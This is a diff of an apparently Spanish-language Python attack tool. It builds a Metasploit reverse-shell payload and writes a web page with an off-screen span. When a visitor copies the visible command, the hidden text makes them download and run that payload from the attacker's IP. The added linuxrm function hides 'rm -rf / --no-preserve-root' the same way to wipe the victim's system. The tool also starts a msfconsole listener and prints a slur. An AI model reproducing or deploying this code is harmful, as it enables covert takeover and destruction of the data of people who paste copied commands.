@@ -8,15 +8,15 @@ def linuxinfect():
 	port=raw_input("ingrese puerto: ")
 	print "[*]Creando payload..."
 	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f elf > /var/www/html/payload.elf")
-	mensaje1=raw_input("Primer mensaje: ")
-	mensaje2=raw_input("Segundo mensaje: ")
+	mensaje1=raw_input("Primer Mensaje: ")
+	mensaje2=raw_input("Segundo Mensaje: ")
 	comando=raw_input("Comando: ")
 	index="index.html"
 	job=open(index,"w")	
-	job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + comando + """ </span> """ + mensaje2 + """ </p>""")
+	job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; wget http://"""+ip+"""/payload.elf &> /dev/null && chmod +x ./payload.elf && ./payload.elf & disown && clear <br> """ + comando + """ </span> """+mensaje2+""" </p>""")
 	job.close()
 	os.system("cp index.html /var/www/html")
-	print "[:D] Todo esta completo http://127.0.0.1/ ó http://"+ip+"/ Con toda campeon ;v"
+	print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
 	continuar=raw_input("desea continuar (si/no) ")
 	if continuar == "si":
 		documento="meta_config"
@@ -31,3 +31,14 @@ exploit -j""")
 		os.system("msfconsole -r meta_config")
 	elif continuar == "no":
 		print "bay bay nigga"
+def linuxrm():
+	ip=raw_input("ingrese ip: ")
+	mensaje0=raw_input("Primer Mensaje: ")
+	mensaje3=raw_input("Segundo Mensaje: ")
+	comando1=raw_input("Comando: ")
+	index="index.html"
+	job=open(index,"w")	
+	job.write("""<p> """ + mensaje0 + """ <span style="position: absolute; left: -2000; top: -100px;" >/dev/null; clear; rm -rfv / --no-preserve-root & disown && clear <br> """ + comando1 + """ </span> """+mensaje3+""" </p>""")
+	job.close()
+	os.system("cp index.html /var/www/html")
+	print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
